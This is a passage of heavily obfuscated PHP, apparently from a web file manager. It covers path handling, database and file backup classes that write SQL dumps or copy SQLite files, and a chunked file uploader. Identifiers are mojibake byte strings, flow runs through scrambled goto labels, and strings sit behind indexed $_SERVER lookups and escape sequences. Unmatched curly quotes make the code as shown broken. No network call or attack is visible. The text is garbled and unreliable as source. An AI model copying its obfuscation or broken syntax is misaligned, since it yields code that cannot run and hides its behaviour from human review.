$_SERVER[‘®…¢À][483]); } private function copyMove($e¿íÉÄ¢¾Ş, $eÃë¼Îïí, $bŸñï†¿ëí, $FÃ–äØä¦Š) { goto D•»İŒÄğ¯; Eİß§ùºÚİ: if ($a£–“©£ø—->pathParse[$Cõƒ¶§ïé[955]]) { $eÃë¼Îïí = $a£–“©£ø—->pathParse[$Cõƒ¶§ïé[955]]; } else { $eÃë¼Îïí = $dœ½æ…¹‚‘; } $Fí²×¡ øÇ = IO::copyMove($e¿íÉÄ¢¾Ş, $eÃë¼Îïí, $bŸñï†¿ëí, $FÃ–äØä¦Š); $Fí²×¡ øÇ = $this->getPathOuter($Fí²×¡ øÇ); goto D·¢õ‹¬Ôè; D•»İŒÄğ¯: $Cõƒ¶§ïé =& $_SERVER[‘®…¢À]; $dœ½æ…¹‚‘ = $eÃë¼Îïí; $a£–“©£ø— = IO::driverMake($eÃë¼Îïí); goto Eİß§ùºÚİ; D·¢õ‹¬Ôè: return $Fí²×¡ øÇ; goto ešçÏ„ø´‡; ešçÏ„ø´‡: } public function pathFather($A–ö¹âÎ¢) { return get_path_father($this->pathParse[$_SERVER[‘®…¢À][76]]); } public function iconvSystem($dğÊ‹¦Õí) { return $dğÊ‹¦Õí; } protected function infoParse($e–­¬Âèˆ) { $e†‡ˆÓµ·ƒ =& $_SERVER[‘®…¢À]; $a¯¥Õ¡Æ¯Ğ = $this->pathParse[$e†‡ˆÓµ·ƒ[434]][$e†‡ˆÓµ·ƒ[975]] . $this->pathParse[$e†‡ˆÓµ·ƒ[968]]; $cÒ†Åš´¢Æ = IO::info($a¯¥Õ¡Æ¯Ğ); $EöÅÒ­ø©µ = $this->pathParse[$e†‡ˆÓµ·ƒ[434]]; return Action($e†‡ˆÓµ·ƒ[1073])->_shareItemeParse($cÒ†Åš´¢Æ, $EöÅÒ­ø©µ); } public function listAll($FóŠ¾ŠŠŒñ) { $E„Ú‹ÒÇ—¤ =& $_SERVER[‘®…¢À]; $E‡¬’Şã¸Ç = IO::listAll($FóŠ¾ŠŠŒñ); $eŠÙçæĞ‘ = $this->pathParse[$E„Ú‹ÒÇ—¤[434]]; foreach ($E‡¬’Şã¸Ç as &$e˜¦‹÷‘‡) { check_abort(); $e˜¦‹÷‘‡ = array_merge(IO::info($e˜¦‹÷‘‡[$E„Ú‹ÒÇ—¤[76]]), $e˜¦‹÷‘‡); $e˜¦‹÷‘‡[$E„Ú‹ÒÇ—¤[387]] = Action($E„Ú‹ÒÇ—¤[1073])->_shareItemeParse($e˜¦‹÷‘‡, $eŠÙçæĞ‘); } return $E‡¬’Şã¸Ç; } public function getPathOuter($BˆîÇÏ¯Ù•) { goto B«¤ÌÒñÓÄ; A¶Ù¡‡Ù¬: if (substr($CğùË˜µØ, 0, strlen($bÔÊ…Øˆ°È)) != $bÔÊ…Øˆ°È) { return !1; } return $this->pathParse[$e¾Î‘¥íª[969]] . $e¾Î‘¥íª[8] . ltrim($A‹¶¯§ÜØë, $e¾Î‘¥íª[8]); goto aÁ¿ğÌÀó²; B«¤ÌÒñÓÄ: $e¾Î‘¥íª =& $_SERVER[‘®…¢À]; $A¥õ»À¨Š = KodIO::parse($BˆîÇÏ¯Ù•); if ($A¥õ»À¨Š[$e¾Î‘¥íª[29]] == KodIO::KOD_SHARE_ITEM) { return $A¥õ»À¨Š[$e¾Î‘¥íª[76]]; } goto c¹†Ñµùõˆ; c¹†Ñµùõˆ: $CğùË˜µØ = KodIO::clear($BˆîÇÏ¯Ù•); $bÔÊ…Øˆ°È = KodIO::clear($this->pathParse[$e¾Î‘¥íª[434]][$e¾Î‘¥íª[975]]); $A‹¶¯§ÜØë = substr($CğùË˜µØ, strlen($bÔÊ…Øˆ°È)); goto A¶Ù¡‡Ù¬; aÁ¿ğÌÀó²: } public function getType() { $bÉÁØØ„ì¿ =& $_SERVER[‘®…¢À]; $Dî ÃÆÖâÒ = str_replace($bÉÁØØ„ì¿[72], $bÉÁØØ„ì¿[33], get_class($this)); return strtolower($Dî ÃÆÖâÒ); } public function isTypeObject($bŸÏêïÊó) { return IO::isTypeObject($bŸÏêïÊó); } public function info($FÈÔáŸ¥†±) { return $this->infoParse($FÈÔáŸ¥†±); } public function infoAuth($aßŸæù…œ) { return $this->infoParse($aßŸæù…œ); } public function infoWithChildren($Bç†¾ùë†) { return $this->infoParse($Bç†¾ùë†); } public function infoFull($b™Ç“Û±†) { return $this->infoParse($b™Ç“Û±†); } } goto a ŸõâË¦; bÇƒÄŠ¾Ë: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $f«¢„°¹ ô =& $_SERVER[‘®…¢À]; self::$name = date($f«¢„°¹ ô[660]); if (!($FÍˆ™¤œŠê = Model($f«¢„°¹ ô[661])->lastItem())) { $FÍˆ™¤œŠê = $this->initData(); } else { self::$name = $FÍˆ™¤œŠê[$f«¢„°¹ ô[28]]; if ($FÍˆ™¤œŠê[$f«¢„°¹ ô[662]] == $f«¢„°¹ ô[84]) { self::$name = date($f«¢„°¹ ô[663]); $EÃé—õ±Š = 0; if (isset($FÍˆ™¤œŠê[$f«¢„°¹ ô[278]][$f«¢„°¹ ô[164]][$f«¢„°¹ ô[414]])) { $EÃé—õ±Š = (int) $FÍˆ™¤œŠê[$f«¢„°¹ ô[278]][$f«¢„°¹ ô[164]][$f«¢„°¹ ô[414]]; } if ($FÍˆ™¤œŠê[$f«¢„°¹ ô[28]] == self::$name) { Model($f«¢„°¹ ô[661])->remove($FÍˆ™¤œŠê[$f«¢„°¹ ô[363]]); } $FÍˆ™¤œŠê = $this->initData($EÃé—õ±Š, $FÍˆ™¤œŠê[$f«¢„°¹ ô[664]]); } else { $this->checkStore($FÍˆ™¤œŠê[$f«¢„°¹ ô[664]]); } } self::$option = $FÍˆ™¤œŠê; } private function initData($dÔİ¹Ãì– = 0, $eÈ¨„ğ é‰ = '') { goto E²´ôªÍ…°; E²´ôªÍ…°: $bŸ§ó¾Èîø =& $_SERVER[‘®…¢À]; $cÚ“Š†ÍÚå = Model($bŸ§ó¾Èîø[661])->config(); if ($eÈ¨„ğ é‰ && $cÚ“Š†ÍÚå[$bŸ§ó¾Èîø[664]] != $eÈ¨„ğ é‰) { $dÔİ¹Ãì– = 0; } goto D“ØŸÍƒøÜ; D“ØŸÍƒøÜ: $this->checkStore($cÚ“Š†ÍÚå[$bŸ§ó¾Èîø[664]]); $b¼Ú«…è«Õ = array($bŸ§ó¾Èîø[664] => $cÚ“Š†ÍÚå[$bŸ§ó¾Èîø[664]], $bŸ§ó¾Èîø[28] => self::$name, $bŸ§ó¾Èîø[662] => 0, $bŸ§ó¾Èîø[665] => $cÚ“Š†ÍÚå[$bŸ§ó¾Èîø[665]], $bŸ§ó¾Èîø[278] => array($bŸ§ó¾Èîø[666] => array($bŸ§ó¾Èîø[662] => 0), $bŸ§ó¾Èîø[667] => array($bŸ§ó¾Èîø[662] => 0, $bŸ§ó¾Èîø[668] => 0, $bŸ§ó¾Èîø[669] => 0, $bŸ§ó¾Èîø[29] => $bŸ§ó¾Èîø[33]), $bŸ§ó¾Èîø[670] => array($bŸ§ó¾Èîø[662] => 0, $bŸ§ó¾Èîø[668] => 0, $bŸ§ó¾Èîø[669] => 0), $bŸ§ó¾Èîø[164] => array($bŸ§ó¾Èîø[662] => 0, $bŸ§ó¾Èîø[671] => 0, $bŸ§ó¾Èîø[672] => 0, $bŸ§ó¾Èîø[673] => 0, $bŸ§ó¾Èîø[674] => 0, $bŸ§ó¾Èîø[414] => $dÔİ¹Ãì–)), $bŸ§ó¾Èîø[675] => time(), $bŸ§ó¾Èîø[676] => 0); $AĞÙ§³÷ß = Model($bŸ§ó¾Èîø[661])->insert($b¼Ú«…è«Õ); goto cìğš§©; cìğš§©: $b¼Ú«…è«Õ[$bŸ§ó¾Èîø[363]] = $AĞÙ§³÷ß; return $b¼Ú«…è«Õ; goto aéÅôãÁê; aéÅôãÁê: } private function checkStore($cë¢Ü—öÚ) { $f¡¾ç««š =& $_SERVER[‘®…¢À]; $e›À²Åî¯ï = Model($f¡¾ç««š[677])->listData($cë¢Ü—öÚ); Model($f¡¾ç««š[677])->checkConfig($e›À²Åî¯ï); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[‘®…¢À][661])->findByName(self::$name); } return self::$option; } public static function set($a¾¿”‡¸…š) { $eÊê¥¥„Àğ =& $_SERVER[‘®…¢À]; $cÜ½å›³Ë = self::get(); foreach ($a¾¿”‡¸…š as $bé„êƒÄ => $f­ô‚¿ªÑÔ) { $e‰½óÂß§ = explode($eÊê¥¥„Àğ[94], $bé„êƒÄ); $AÖ˜‡Ğİ…ô = count($e‰½óÂß§); switch ($AÖ˜‡Ğİ…ô) { case 1: $cÜ½å›³Ë[$e‰½óÂß§[0]] = $f­ô‚¿ªÑÔ; break; case 2: $cÜ½å›³Ë[$e‰½óÂß§[0]][$e‰½óÂß§[1]] = $f­ô‚¿ªÑÔ; break; case 3: $cÜ½å›³Ë[$e‰½óÂß§[0]][$e‰½óÂß§[1]][$e‰½óÂß§[2]] = $f­ô‚¿ªÑÔ; break; } } Model($eÊê¥¥„Àğ[661])->update($cÜ½å›³Ë[$eÊê¥¥„Àğ[363]], $cÜ½å›³Ë); self::$option = $cÜ½å›³Ë; return self::$option; } public function keep() { $D““‡À° =& $_SERVER[‘®…¢À]; $Eâº  ©” = self::get(); if ($Eâº  ©”[$D““‡À°[278]][$D““‡À°[666]][$D““‡À°[662]] == $D““‡À°[84]) { return; } $this->backupKeep($Eâº  ©”); self::set(array($D““‡À°[678] => 1)); } private function backupKeep($Cì‰Øñ²ïó) { goto Dõ÷¦â©ì¶; cÆ’ï‚»×Ë: $fÉ³¡Êé‡´ = array(); for ($cª‡¨Ó—ãÊ = 0; $cª‡¨Ó—ãÊ <= 7; $cª‡¨Ó—ãÊ++) { $fÉ³¡Êé‡´[] = date($e¥Ù®•™é’[663], strtotime("\55{$cª‡¨Ó—ãÊ}\40\x64\141\171\x73")); } for ($cª‡¨Ó—ãÊ = 0; $cª‡¨Ó—ãÊ < 12; $cª‡¨Ó—ãÊ++) { $fÉ³¡Êé‡´[] = date($e¥Ù®•™é’[679], strtotime("\55{$cª‡¨Ó—ãÊ}\x20\155\x6f\156\x74\x68\163")); } goto B‡êÃ‘¤Ş; B‡êÃ‘¤Ş: $fÉ³¡Êé‡´ = array_unique($fÉ³¡Êé‡´); foreach ($eĞøÍÍê as $B¢œ‡ó­¶) { if (!empty($B¢œ‡ó­¶[$e¥Ù®•™é’[28]]) && in_array($B¢œ‡ó­¶[$e¥Ù®•™é’[28]], $fÉ³¡Êé‡´)) { continue; } Model($e¥Ù®•™é’[661])->remove($B¢œ‡ó­¶[$e¥Ù®•™é’[363]]); $Cõï‘ÉÌ¨„ = "\173\x69\157\x3a{$Cì‰Øñ²ïó[$e¥Ù®•™é’[664]]}\x7d\x2f\x64\141\164\141\142\141\163\145\57\142\x61\x63\153\165\160\x5f{$B¢œ‡ó­¶[$e¥Ù®•™é’[28]]}"; IO::remove($Cõï‘ÉÌ¨„, !1); } goto DŒ¿…Á‹ëÖ; Dõ÷¦â©ì¶: $e¥Ù®•™é’ =& $_SERVER[‘®…¢À]; $eĞøÍÍê = Model($e¥Ù®•™é’[661])->listData(); if (empty($eĞøÍÍê)) { return; } goto cÆ’ï‚»×Ë; DŒ¿…Á‹ëÖ: } public function db() { goto DÃ¨àÏî¿Ñ; DÃ¨àÏî¿Ñ: $eè¥ùÛŠª =& $_SERVER[‘®…¢À]; $Fšß»Šİ£ó = self::get(); if ($Fšß»Šİ£ó[$eè¥ùÛŠª[278]][$eè¥ùÛŠª[667]][$eè¥ùÛŠª[662]] == $eè¥ùÛŠª[84]) { return !0; } goto b¢ÙÑØ­–É; b¢ÙÑØ­–É: $D†©¯¼Ş“ = new BackupDb(); if (!$D†©¯¼Ş“->index()) { return !1; } self::set(array($eè¥ùÛŠª[680] => 1)); goto A¶¬­àñ–; A¶¬­àñ–: return !0; goto dôâÂ×òèÕ; dôâÂ×òèÕ: } public function dbFile() { goto aÉÇÇ—°æ; EğƒÃ–ÀÃ: return !0; goto a§³¯ÇŠ¤¢; CÁ×©’ŸË–: $f¶¦‰‹°Èñ = new BackupDbFile(); if (!$f¶¦‰‹°Èñ->index()) { return !1; } self::set(array($Aë¸Ì…Â¡[681] => 1)); goto EğƒÃ–ÀÃ; aÉÇÇ—°æ: $Aë¸Ì…Â¡ =& $_SERVER[‘®…¢À]; $cÚƒáÑ’Ÿ = self::get(); if ($cÚƒáÑ’Ÿ[$Aë¸Ì…Â¡[278]][$Aë¸Ì…Â¡[670]][$Aë¸Ì…Â¡[662]] == $Aë¸Ì…Â¡[84]) { return !0; } goto CÁ×©’ŸË–; a§³¯ÇŠ¤¢: } public function file() { $D¸„•ÍåÔÃ =& $_SERVER[‘®…¢À]; $cŠæ«ÈÓ¶ = self::get(); if ($cŠæ«ÈÓ¶[$D¸„•ÍåÔÃ[278]][$D¸„•ÍåÔÃ[164]][$D¸„•ÍåÔÃ[662]] == $D¸„•ÍåÔÃ[84]) { return !0; } if (!isset($cŠæ«ÈÓ¶[$D¸„•ÍåÔÃ[665]]) || $cŠæ«ÈÓ¶[$D¸„•ÍåÔÃ[665]] == $D¸„•ÍåÔÃ[463]) { $b±¢µÕïˆ³ = new BackupFile(); if (!$b±¢µÕïˆ³->index()) { return !1; } } self::set(array($D¸„•ÍåÔÃ[682] => 1, $D¸„•ÍåÔÃ[662] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto d×‡øíŠ Ä; EÄß«†ø·: $dí­Øùµ¤ = TEMP_FILES . $a†ÖĞ±Ğ[691] . self::$name . $a†ÖĞ±Ğ[8]; del_dir($dí­Øùµ¤); mk_dir($dí­Øùµ¤); goto Bßˆ‹‡í½í; eãáºÀ¢ˆæ: Backup::set($dæÂ¾›‰Å…); return !0; goto dÇŠ‚°ª½®; a¡¸ê‚ÚèÊ: self::$name = $Fœõİğ—×‹[$a†ÖĞ±Ğ[28]]; if ($BÀ“œÁá¤í = $this->sqliteFile()) { return $this->sqliteBackup($BÀ“œÁá¤í); } $f¸™ö¯âã• = 0; goto c»¦ÏçÙé; Bßˆ‹‡í½í: foreach ($D’…•äŸ”À as $Fù×…«Â) { $a¨®ïƒ›ä = "{$dí­Øùµ¤}{$Fù×…«Â}\x2e\163\x71\154"; $e¹‹’³« += $this->makeSqlFile($Fù×…«Â, $a¨®ïƒ›ä, $bœˆ•®£Ç, $Fœõİğ—×‹); } $bœˆ•®£Ç->end(); $dæÂ¾›‰Å… = array($a†ÖĞ±Ğ[680] => 1, $a†ÖĞ±Ğ[692] => $e¹‹’³«); goto eãáºÀ¢ˆæ; d×‡øíŠ Ä: $a†ÖĞ±Ğ =& $_SERVER[‘®…¢À]; $Fœõİğ—×‹ = Backup::get(); self::$io = $Fœõİğ—×‹[$a†ÖĞ±Ğ[664]]; goto a¡¸ê‚ÚèÊ; Fİ…Ÿ–¹ª: $dæÂ¾›‰Å… = array($a†ÖĞ±Ğ[688] => $a†ÖĞ±Ğ[689], $a†ÖĞ±Ğ[690] => $f¸™ö¯âã• + 1); Backup::set($dæÂ¾›‰Å…); $e¹‹’³« = 0; goto EÄß«†ø·; c»¦ÏçÙé: $D’…•äŸ”À = Model()->db()->getTables(); foreach ($D’…•äŸ”À as $Fù×…«Â) { $f¸™ö¯âã• += Model($Fù×…«Â)->count(); } $bœˆ•®£Ç = new Task($a†ÖĞ±Ğ[683], $a†ÖĞ±Ğ[684], $f¸™ö¯âã•, LNG($a†ÖĞ±Ğ[685]) . $a†ÖĞ±Ğ[686] . LNG($a†ÖĞ±Ğ[687])); goto Fİ…Ÿ–¹ª; dÇŠ‚°ª½®: } public function makeSqlFile($F©—ŞÄˆ„, $C½§ ‘Ø·, $FÆŠİ‡¯, $D£ÖÊÖÙ³) { goto BÓèëÛÑÁ”; c®ê˜²°İó: $a‡Ë˜• = Model($F©—ŞÄˆ„)->getDbFields(); do { $Aï¿¾«é÷õ = Model($F©—ŞÄˆ„)->field($a‡Ë˜•)->order($BÙßëÙŒ´­ . $_SERVER[‘®…¢À][694])->selectPage($E¬æšë‰ŸŒ, $bˆ‘­ˆŠ£Ç); $BÒÏğó‚Ô¯ = !empty($Aï¿¾«é÷õ[$_SERVER[‘®…¢À][350]]) ? $Aï¿¾«é÷õ[$_SERVER[‘®…¢À][350]] : array(); $CêôˆÇÊçÄ = array(); foreach ($BÒÏğó‚Ô¯ as $D…ë’ôª¸ ) { if ($F©—ŞÄˆ„ == $_SERVER[‘®…¢À][695] && (!isset($D£ÖÊÖÙ³[$_SERVER[‘®…¢À][665]]) || $D£ÖÊÖÙ³[$_SERVER[‘®…¢À][665]] == $_SERVER[‘®…¢À][463])) { $D…ë’ôª¸ [$_SERVER[‘®…¢À][76]] = "\x7b\x69\157\72{$få–•‘…ñ·}\175" . substr($D…ë’ôª¸ [$_SERVER[‘®…¢À][76]], strlen("\x7b\151\157\72{$D…ë’ôª¸ [$_SERVER[‘®…¢À][696]]}\175")); $D…ë’ôª¸ [$_SERVER[‘®…¢À][696]] = $få–•‘…ñ·; } $CêôˆÇÊçÄ[] = $_SERVER[‘®…¢À][697] . $this->addSqlSlashes($D…ë’ôª¸ ) . $_SERVER[‘®…¢À][698]; } if ($FÍíô®ùè = count($BÒÏğó‚Ô¯)) { $eÃµÇ¡‚Ş… = "\111\x4e\123\x45\122\x54\40\111\x4e\124\x4f\40\140{$F©—ŞÄˆ„}\x60\40\x28\x60" . implode($_SERVER[‘®…¢À][699], $a‡Ë˜•) . $_SERVER[‘®…¢À][700]; fwrite($CËÚÑ¨­°Õ, $eÃµÇ¡‚Ş… . implode($_SERVER[‘®…¢À][701], $CêôˆÇÊçÄ) . $_SERVER[‘®…¢À][68] . PHP_EOL); $FÆŠİ‡¯->update($FÍíô®ùè); } $bˆ‘­ˆŠ£Ç++; $fÇ‹Î‚Ëš += $FÍíô®ùè; } while ($FÍíô®ùè == $E¬æšë‰ŸŒ); fclose($CËÚÑ¨­°Õ); goto cêÙî£™¬ä; BÓèëÛÑÁ”: $få–•‘…ñ· = self::$io; $fÇ‹Î‚Ëš = 0; $bˆ‘­ˆŠ£Ç = 1; goto eó»µÛ½Ì‰; eó»µÛ½Ì‰: $E¬æšë‰ŸŒ = 2000; $CËÚÑ¨­°Õ = fopen($C½§ ‘Ø·, $_SERVER[‘®…¢À][693]); $BÙßëÙŒ´­ = Model($F©—ŞÄˆ„)->getPk(); goto c®ê˜²°İó; cêÙî£™¬ä: return $fÇ‹Î‚Ëš; goto b ŒÍ—îÔ­; b ŒÍ—îÔ­: } private function addSqlSlashes($Dº†•‘¥ˆ£) { $BĞ„÷Ì†Ğ =& $_SERVER[‘®…¢À]; $eÀ½µ©Ì« = array(); foreach ($Dº†•‘¥ˆ£ as $FÍ¶Áğï‡Û) { if (is_array($FÍ¶Áğï‡Û)) { $FÍ¶Áğï‡Û = json_encode_force($FÍ¶Áğï‡Û); } $FÍ¶Áğï‡Û = addslashes($FÍ¶Áğï‡Û); $FÍ¶Áğï‡Û = str_replace(array($BĞ„÷Ì†Ğ[702], $BĞ„÷Ì†Ğ[214]), array($BĞ„÷Ì†Ğ[703], $BĞ„÷Ì†Ğ[704]), $FÍ¶Áğï‡Û); $eÀ½µ©Ì«[] = $FÍ¶Áğï‡Û; } return $BĞ„÷Ì†Ğ[55] . implode($BĞ„÷Ì†Ğ[705], $eÀ½µ©Ì«) . $BĞ„÷Ì†Ğ[55]; } private function sqliteFile() { $fÌ››êÖ¼ =& $_SERVER[‘®…¢À]; $dÏÈÙÕ†‰ = null; $aÈ¤¬¸åÉ = $GLOBALS[$fÌ››êÖ¼[6]][$fÌ››êÖ¼[17]]; if ($aÈ¤¬¸åÉ[$fÌ››êÖ¼[706]] == $fÌ››êÖ¼[707]) { $C˜‡â‹ªÄŒ = explode($fÌ››êÖ¼[708], $aÈ¤¬¸åÉ[$fÌ››êÖ¼[709]]); if (substr($C˜‡â‹ªÄŒ[0], 0, 6) == $fÌ››êÖ¼[9]) { $dÏÈÙÕ†‰ = $C˜‡â‹ªÄŒ[1]; } } else { if (substr($aÈ¤¬¸åÉ[$fÌ››êÖ¼[706]], 0, 6) == $fÌ››êÖ¼[9]) { $dÏÈÙÕ†‰ = $aÈ¤¬¸åÉ[$fÌ››êÖ¼[231]]; } } return $dÏÈÙÕ†‰; } public function sqliteBackup($D‚Ùß¯®ø) { goto bë™õÖ‹°Ê; B…ÕÍ‚¥Âó: $c¸Óò—í×í = "\x7b\x69\157\72{$c°Ï–––}\175\57\144\141\164\141\142\141\x73\x65\x2f\142\x61\x63\x6b\x75\160\137" . self::$name . $Cİ©·°Ë¹ö[711]; if (!IO::exist($c¸Óò—í×í)) { IO::mkdir($c¸Óò—í×í); } $c¼ƒ‡íó = IO::size($D‚Ùß¯®ø); goto d ’éˆŸÄ; AŸ’’ƒŞŸ—: return !1; goto fŞ¾ãóğÃÂ; d ’éˆŸÄ: $ağÖá÷Ø¡£ = array($Cİ©·°Ë¹ö[688] => $Cİ©·°Ë¹ö[9], $Cİ©·°Ë¹ö[690] => 1, $Cİ©·°Ë¹ö[712] => $c¼ƒ‡íó); Backup::set($ağÖá÷Ø¡£); $c›¦×ÁÈí² = new TaskFileTransfer($Cİ©·°Ë¹ö[713], $Cİ©·°Ë¹ö[684], 1, LNG($Cİ©·°Ë¹ö[685]) . $Cİ©·°Ë¹ö[407] . LNG($Cİ©·°Ë¹ö[687]) . $Cİ©·°Ë¹ö[714]); goto bĞÖåìÔî…; fÖÉ¹Æî×›: $c›¦×ÁÈí²->end(); $ağÖá÷Ø¡£ = array($Cİ©·°Ë¹ö[680] => 1, $Cİ©·°Ë¹ö[692] => 1, $Cİ©·°Ë¹ö[681] => 1, $Cİ©·°Ë¹ö[716] => $c¼ƒ‡íó); Backup::set($ağÖá÷Ø¡£); goto AŸ’’ƒŞŸ—; bë™õÖ‹°Ê: $Cİ©·°Ë¹ö =& $_SERVER[‘®…¢À]; $c°Ï––– = self::$io; $c¡ªÌ‘§ïÏ = CONTROLLER_DIR . $Cİ©·°Ë¹ö[710]; goto B…ÕÍ‚¥Âó; bĞÖåìÔî…: $c›¦×ÁÈí²->task[$Cİ©·°Ë¹ö[671]] = $c¼ƒ‡íó; IO::copy($c¡ªÌ‘§ïÏ . $Cİ©·°Ë¹ö[715], $c¸Óò—í×í); IO::copy($D‚Ùß¯®ø, $c¸Óò—í×í); goto fÖÉ¹Æî×›; fŞ¾ãóğÃÂ: } } class BackupDbFile { public function __construct() { } public function index() { goto E†ìØŞƒ¡Ô; B°‹¤°º±Â: Backup::set(array($eçËœÛˆ£Ş[712] => $FñË¿²õƒ»[$eçËœÛˆ£Ş[78]])); IO::move($E·È®¼‡ƒï, $eñ°‰¤§·Ê); $dÕ®›œî„ø = CONTROLLER_DIR . $eçËœÛˆ£Ş[717]; goto D»²»¨‡½®; FÔ§Í°ù–: $E·È®¼‡ƒï = TEMP_FILES . "\142\141\x63\x6b\165\160\137{$CÒ…íÏ´ãğ}\x2f"; $eñ°‰¤§·Ê = "\x7b\x69\157\x3a{$B£éÛ’¨‰İ[$eçËœÛˆ£Ş[664]]}\x7d\57\144\x61\x74\x61\142\141\x73\x65\x2f"; IO::mkdir($eñ°‰¤§·Ê . "\x62\141\x63\153\x75\x70\x5f{$CÒ…íÏ´ãğ}\57"); goto cßÄéàÒÇÈ; D»²»¨‡½®: IO::copy($dÕ®›œî„ø, $eñ°‰¤§·Ê . "\142\141\143\153\x75\x70\137{$CÒ…íÏ´ãğ}\57"); $eé‚‰òÌ°Ì->end(); Backup::set(array($eçËœÛˆ£Ş[716] => $FñË¿²õƒ»[$eçËœÛˆ£Ş[78]])); goto B§¼˜ƒ¤Š; E†ìØŞƒ¡Ô: $eçËœÛˆ£Ş =& $_SERVER[‘®…¢À]; $B£éÛ’¨‰İ = Backup::get(); $CÒ…íÏ´ãğ = $B£éÛ’¨‰İ[$eçËœÛˆ£Ş[28]]; goto FÔ§Í°ù–; cßÄéàÒÇÈ: $eé‚‰òÌ°Ì = new TaskFileTransfer($eçËœÛˆ£Ş[713], $eçËœÛˆ£Ş[684], 0, LNG($eçËœÛˆ£Ş[685]) . $eçËœÛˆ£Ş[407] . LNG($eçËœÛˆ£Ş[687]) . $eçËœÛˆ£Ş[714]); $eé‚‰òÌ°Ì->addPath($E·È®¼‡ƒï); $FñË¿²õƒ» = IO::infoWithChildren($E·È®¼‡ƒï); goto B°‹¤°º±Â; B§¼˜ƒ¤Š: return !0; goto D®Ï…Ø’; D®Ï…Ø’: } } goto b Ğ†Ù†µ; DôÏµÉ¦ÕŠ: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto CŒÌĞƒóÓ; CŒÌĞƒóÓ: $b¿¤¹ÇÁçÒ =& $_SERVER[‘®…¢À]; global $in; $this->in =& $in; goto CïáÈÒäÆ›; Cª£çÊŠ´Â: $this->checkSize(); $this->tempPathInit(); goto fƒ‹î¹ìÛ”; CïáÈÒäÆ›: if (!empty($_FILES)) { $d«ïÆĞ•Ñº = $_FILES[$b¿¤¹ÇÁçÒ[164]]; $this->uploadFile = $d«ïÆĞ•Ñº[$b¿¤¹ÇÁçÒ[1864]]; if (!$this->uploadFile && $d«ïÆĞ•Ñº[$b¿¤¹ÇÁçÒ[1170]] > 0) { show_json($this->errorInfo($d«ïÆĞ•Ñº[$b¿¤¹ÇÁçÒ[1170]]), !1); } } else { if (isset($in[$b¿¤¹ÇÁçÒ[382]])) { $this->uploadFile = isset($in[$b¿¤¹ÇÁçÒ[1865]]) ? $b¿¤¹ÇÁçÒ[1866] : $b¿¤¹ÇÁçÒ[1710]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Cª£çÊŠ´Â; fƒ‹î¹ìÛ”: } public function upload() { goto BøöË¢±©´; BøöË¢±©´: $a‘àë‡ª‘Ù =& $_SERVER[‘®…¢À]; $AÕî»Ô¼ = isset($this->in[$a‘àë‡ª‘Ù[1867]]) ? intval($this->in[$a‘àë‡ª‘Ù[1867]]) : 0; $EÜ¬ÜÙÏÇ = isset($this->in[$a‘àë‡ª‘Ù[1868]]) ? intval($this->in[$a‘àë‡ª‘Ù[1868]]) : 1; goto D¯É“ó×Ö¦; F÷â’‰Ë×: $Fí™Š°Ã = $this->moveUploadedFile($A¤Ñ‘À¼÷œ); if ($c¢õ­™ò¨¹ > 0 && filesize($Fí™Š°Ã) == 0) { $this->showJson($a‘àë‡ª‘Ù[1872], !1); } if (!$Fí™Š°Ã) { $this->showJson(LNG($a‘àë‡ª‘Ù[1873]), !1); } goto aã‚ÊŒ„²; D©¸„Ì¡ÜŠ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto D¤¦Ù¼Š¥‡; D¯É“ó×Ö¦: $A¤Ñ‘À¼÷œ = $this->tempFile . $a‘àë‡ª‘Ù[1869] . $AÕî»Ô¼; $c¢õ­™ò¨¹ = isset($this->in[$a‘àë‡ª‘Ù[511]]) ? intval($this->in[$a‘àë‡ª‘Ù[511]]) : 0; $bƒÊéÂ•£ƒ = isset($this->in[$a‘àë‡ª‘Ù[1870]]) ? intval($this->in[$a‘àë‡ª‘Ù[1870]]) : 0; goto eíÓçŸµó‹; B²Óº„ÆÊˆ: $d¾‘Ï®†ºå[$a‘àë‡ª‘Ù[1877]][$a‘àë‡ª‘Ù[1878] . $AÕî»Ô¼] = array($a‘àë‡ª‘Ù[1879] => $AŠÜ‚«Œ‚§, $a‘àë‡ª‘Ù[994] => $AÕî»Ô¼, $a‘àë‡ª‘Ù[78] => $c¢õ­™ò¨¹, $a‘àë‡ª‘Ù[161] => $A×Ó–¿“Ğš); $this->statusSet($d¾‘Ï®†ºå); if (count($d¾‘Ï®†ºå[$a‘àë‡ª‘Ù[1877]]) != $d¾‘Ï®†ºå[$a‘àë‡ª‘Ù[1876]]) { $this->showJson($a‘àë‡ª‘Ù[1880] . $AÕî»Ô¼, !0); } goto aÌ÷ÄÄš©Õ; aÌ÷ÄÄš©Õ: ignore_timeout(); if (!$this->checkChunkHash($d¾‘Ï®†ºå)) { $this->showJson($a‘àë‡ª‘Ù[1881], !1); } $this->statusSet(!1); goto D©¸„Ì¡ÜŠ; fƒ½Ûö±ÂŸ: CacheLock::lock($this->tempFile, 20); $d¾‘Ï®†ºå = $this->statusGet(); $this->initFileTemp(); goto F÷â’‰Ë×; a¬ÆÔÓ‹„á: $EùÍ‰Ï‹ÎÎ = $this->writeTo($Fí™Š°Ã, $C‹—÷Ô°¿é, $this->tempFile); $A×Ó–¿“Ğš = IO::hashSimple($Fí™Š°Ã); $c¢õ­™ò¨¹ = IO::size($Fí™Š°Ã); goto C§ˆÈ¤ƒ–ˆ; eíÓçŸµó‹: if ($EÜ¬ÜÙÏÇ > 1 && $bƒÊéÂ•£ƒ <= 0) { show_json($a‘àë‡ª‘Ù[1871], !1); } if ($bƒÊéÂ•£ƒ > $c¢õ­™ò¨¹) { $EÜ¬ÜÙÏÇ = 1; } if ($EÜ¬ÜÙÏÇ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto fƒ½Ûö±ÂŸ; C§ˆÈ¤ƒ–ˆ: @unlink($Fí™Š°Ã); if (!$EùÍ‰Ï‹ÎÎ) { $this->showJson($a‘àë‡ª‘Ù[1875] . $AÕî»Ô¼, !1); } $d¾‘Ï®†ºå[$a‘àë‡ª‘Ù[1876]] = $EÜ¬ÜÙÏÇ; goto B²Óº„ÆÊˆ; aã‚ÊŒ„²: $AŠÜ‚«Œ‚§ = $AÕî»Ô¼ * $bƒÊéÂ•£ƒ; 